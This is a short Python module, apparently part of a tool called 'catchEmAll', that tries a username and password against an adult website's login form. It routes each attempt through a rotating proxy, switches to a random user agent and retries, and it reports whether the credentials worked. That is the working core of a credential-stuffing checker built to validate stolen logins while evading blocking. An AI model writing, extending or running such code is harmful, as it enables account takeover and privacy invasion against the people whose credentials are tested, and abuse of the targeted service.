from logging import debug

from catchEmAll.proxyrequests.proxy_requests import ProxyRequest


def youporn(usr: str, pwd: str, mr: ProxyRequest):
    post_url = "https://www.youporn.com/login/"
    # Post request to login
    res = mr.post_with_checks(post_url,
                              data={'login[username]': usr,
                                    'login[password]': pwd,
                                    'login[previous]': '',
                                    'login[logical_data': '{}',
                                    })
    mr.clear_cookies()
    if res:
        # TODO has some false positive
        if "Bad credentials" in str(res.text):
            return False
        else:
            print(res.content)
            return True
    else:
        debug("Youporn problem")
        mr.set_random_proxy()
        mr._set_random_user_agent()
        return youporn(usr, pwd, mr)